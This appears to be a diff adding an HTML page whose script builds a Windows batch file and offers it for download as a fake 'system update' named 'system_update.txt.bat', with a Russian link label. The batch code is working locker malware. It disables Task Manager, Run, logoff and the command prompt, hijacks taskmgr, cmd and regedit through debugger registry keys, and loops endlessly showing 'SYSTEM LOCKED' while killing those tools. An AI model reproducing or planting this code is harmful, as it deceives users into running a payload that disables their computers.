@@ -1,0 +1,30 @@
+<html>
+<body>
+<script>
+var batCode = `@echo off
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d 1 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoClose" /t REG_DWORD /d 1 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLogOff" /t REG_DWORD /d 1 /f >nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f >nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f >nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f >nul
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d 2 /f >nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorkstation" /t REG_DWORD /d 1 /f >nul
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "SetupExecute" /t REG_MULTI_SZ /d "cmd.exe /c reg delete \"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /f & reg delete \"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\" /f & reg delete \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe\" /f & reg delete \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe\" /f & reg delete \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe\" /f & reg delete \"HKLM\SOFTWARE\Policies\Microsoft\Windows\System\" /f & reg delete \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"DisableLockWorkstation\" /f" /f >nul
+:loop
+start cmd /c "echo SYSTEM LOCKED - Use Ctrl+Alt+Del and restart && pause >nul"
+taskkill /f /im taskmgr.exe >nul 2>&1
+taskkill /f /im cmd.exe >nul 2>&1
+taskkill /f /im regedit.exe >nul 2>&1
+goto loop`;
+
+var batDataUri = 'data:text/plain;base64,' + btoa(batCode);
+var link = document.createElement('a');
+link.href = batDataUri;
+link.download = 'system_update.txt.bat';
+link.innerHTML = 'Скачать системное обновление';
+document.body.appendChild(link);
+</script>
+</body>
+</html>
